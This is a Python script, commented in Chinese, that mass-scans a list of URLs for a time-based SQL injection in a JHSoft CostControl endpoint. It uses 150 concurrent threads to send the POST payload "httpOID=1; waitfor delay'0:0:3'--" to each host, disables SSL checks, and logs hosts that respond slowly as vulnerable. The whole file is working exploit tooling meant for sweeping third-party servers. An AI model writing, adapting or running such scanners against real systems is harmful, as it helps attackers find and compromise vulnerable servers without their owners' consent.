import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# 线程锁，用于文件写入
file_lock = threading.Lock()

def check_url_vulnerability(url, timeout=10):
    """
    检查单个URL是否存在漏洞
    """
    # 确保URL格式正确
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # 目标路径
    target_path = "/c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollect.aspx/"
    target_url = base_url + target_path
    
    # 请求头
    headers = {
        'Host': parsed_url.netloc,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # POST数据
    data = "httpOID=1; waitfor delay'0:0:3'--"
    
    try:
        # 记录开始时间
        start_time = time.time()
        
        # 发送请求，禁用SSL验证，禁止重定向
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=timeout
        )
        
        # 计算响应时间
        response_time = time.time() - start_time
        status_code = response.status_code
        
        # 判断逻辑
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[INFO] {url} - 状态码 {status_code} (3xx重定向)，不存在漏洞")
            return False, url, status_code, response_time
        
        elif status_code == 200 and response_time > 3:
            # 状态码200且响应时间大于3秒，存在漏洞
            print(f"[VULNERABLE] {url} - 存在漏洞！响应时间: {response_time:.2f}秒")
            return True, url, status_code, response_time
        
        else:
            # 其他情况，不存在漏洞
            print(f"[INFO] {url} - 状态码 {status_code}，响应时间: {response_time:.2f}秒，不存在漏洞")
            return False, url, status_code, response_time
            
    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] {url} - 请求超时")
        return False, url, None, None
        
    except requests.exceptions.SSLError as e:
        print(f"[SSL ERROR] {url} - SSL错误: {e}")
        return False, url, None, None
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求错误: {e}")
        return False, url, None, None

def write_vulnerability_to_file(vuln_info):
    """
    将漏洞信息写入文件（使用线程锁保证线程安全）
    """
    with file_lock:
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(f"漏洞URL: {vuln_info['url']}\n")
            f.write(f"状态码: {vuln_info['status_code']}\n")
            f.write(f"响应时间: {vuln_info['response_time']:.2f}秒\n")
            f.write(f"检测时间: {vuln_info['timestamp']}\n")
            f.write("-" * 50 + "\n\n")
            print(f"[SAVED] 漏洞已保存到 result.txt: {vuln_info['url']}")

def process_url(url):
    """
    处理单个URL
    """
    url = url.strip()
    if not url:
        return
    
    is_vulnerable, checked_url, status_code, response_time = check_url_vulnerability(url)
    
    if is_vulnerable:
        # 存在漏洞，立即写入文件
        vuln_info = {
            'url': checked_url,
            'status_code': status_code,
            'response_time': response_time,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        write_vulnerability_to_file(vuln_info)

def main():
    # 禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # 读取URL文件
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 找不到 url.txt 文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取文件时出错: {e}")
        return
    
    if not urls:
        print("[WARNING] url.txt 文件中没有有效的URL")
        return
    
    print(f"[INFO] 开始检测，共 {len(urls)} 个URL，线程数: 150")
    print("-" * 50)
    
    # 使用线程池并发执行
    with ThreadPoolExecutor(max_workers=150) as executor:
        # 提交所有任务
        futures = {executor.submit(process_url, url): url for url in urls}
        
        # 等待所有任务完成
        for future in as_completed(futures):
            try:
                future.result()  # 获取结果，如果有异常会在这里抛出
            except Exception as e:
                url = futures[future]
                print(f"[ERROR] 处理URL时出错 {url}: {e}")
    
    print("-" * 50)
    print("[INFO] 检测完成")

if __name__ == "__main__":
    # 清空或创建结果文件
    open('result.txt', 'w').close()
    
    # 运行主函数
    main()